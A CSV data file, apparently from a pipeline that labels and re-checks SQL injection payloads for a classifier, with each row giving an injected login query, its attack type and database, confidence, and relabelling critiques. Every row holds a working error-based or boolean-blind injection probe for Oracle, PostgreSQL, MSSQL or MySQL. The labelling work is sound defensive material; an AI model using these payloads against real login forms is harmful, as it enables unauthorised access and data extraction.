payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
"select * from users WHERE username = ""-5352%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg",True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" or username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"select * from users WHERE username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" or username = ""-1254"" or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""-5291\' ) ) or username = ""-7072\' ) or username = ""1 ) ) ) and ( ( ( 9548 = 9548"" or username = ""1\' ) ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-5291\' ) ) or username = ""-7072\' ) or username = ""1 ) ) ) and ( ( ( 9548 = 9548"" or username = ""1\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-9553 ) )",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-9553 ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-6823\' ) ) ) and ( ( ( \'lwlk\' like \'lwlk"" or username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-6823\' ) ) ) and ( ( ( \'lwlk\' like \'lwlk"" or username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" and username = ""1%\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'%\' = \'""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" and username = ""1%\' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""1",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-2992\' ) ) and ( ( \'tjgt\' = \'tjgt""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'blak\' = \'blak"" or username = ""-4322\' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,-4322\' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""1 ) ) ) and ( ( ( 4694 = 4694"" or username = ""1 ) ) as xoch where 8765 = 8765 or username = ""-7199\' and \'qibr\' = \'qibr""",auth_bypass,generic,0.6,quote injection,RELABEL,reasoning too short (15 chars); confidence too low (0.60),auth_bypass,generic,"1 ) ) as xoch where 8765 = 8765 or username = ""-7199\' and \'qibr\' = \'qibr",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'%\' = \'"" or username = ""1\' ) ) )",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-9688%\' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'%\' = \'"" or username = ""1\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8254 = 8254"" or username = ""-6190\' ) where 2621 = 2621",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"select * from users WHERE username = ""-7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8254 = 8254"" or username = ""-6190\' ) where 2621 = 2621",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1\' and \'fbzo\' like \'fbzo""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1%\' ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""1\' and \'fbzo\' like \'fbzo",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-3978 and username = ""1 ) ) ) and ( ( ( 4694 = 4694""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"-3978 and username = ""1 ) ) ) and ( ( ( 4694 = 4694",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545 or username = ""-6036 ) ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-1254"" and username = ""-1344 ) as gqgi where 2545 = 2545 or username = ""-6036 ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-9501\' ) and ( \'%\' = \'"" and username = ""-6665\' ) ) )",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-9501\' ) and ( \'%\' = \'"" and username = ""-6665\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-2181\' ) or# 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( \'wyez\' = \'wyez"" and username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-2181\' ) or# 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( \'wyez\' = \'wyez,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1%\'",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""1%\'",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-5751 ) as jybu where 4739 = 4739 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-5751 ) as jybu where 4739 = 4739 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"SELECT * FROM users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" OR username = ""1\' ) where 2511 = 2511",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,"SELECT * FROM users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" OR username = ""1\' ) where 2511 = 2511",False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) and ( ( \'guxv\' = \'guxv"" and username = ""-8112\' ) ) )",auth_bypass,generic,0.6,quote injection,RELABEL,reasoning too short (15 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1\' ) ) and ( ( \'guxv\' = \'guxv"" and username = ""-8112\' ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'""",error_based,oracle,0.95,xmltype for Oracle error extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1 ) as nbno where 9816 = 9816 and username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) or username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'""",error_based,mysql,0.8,elt and if for MySQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1\' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) or username = ""-8828%\' ) ) ) and ( ( ( \'%\' = \'",True,1,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
"select * from users WHERE username = ""1 and username = ""1\' ) and ( \'rjjo\' = \'rjjo"" or username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso""",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"1 and username = ""1\' ) and ( \'rjjo\' = \'rjjo"" or username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso",True,1,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" and username = ""-6244\' ) as szpd where 8445 = 8445 or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --""",error_based,mssql,0.8,char for MSSQL encoding,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,oracle,1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\',True,1,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
"select * from users WHERE username = ""-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz"" or username = ""1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,1 ) ) as dgso where 4654 = 4654 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-1985 ) ) ) and ( ( ( 1248 = 1248""",error_based,oracle,0.9,cast for PostgreSQL injection,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""1 ) and ( 9932 = 9932"" or username = ""1 ) where 6039 = 6039",auth_bypass,generic,0.6,wildcard injection,RELABEL,reasoning too short (18 chars); confidence too low (0.60),auth_bypass,generic,"select * from users WHERE username = ""1 ) and ( 9932 = 9932"" or username = ""1 ) where 6039 = 6039",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
"select * from users WHERE username = ""-3424\' ) ) and ( ( \'dyuo\' = \'dyuo"" or username = ""-5013\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'ehwh\' like \'ehwh""",error_based,mssql,0.85,convert int for MSSQL extraction,RELABEL,rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"-5013\' ) ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( \'ehwh\' like \'ehwh",True,1,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
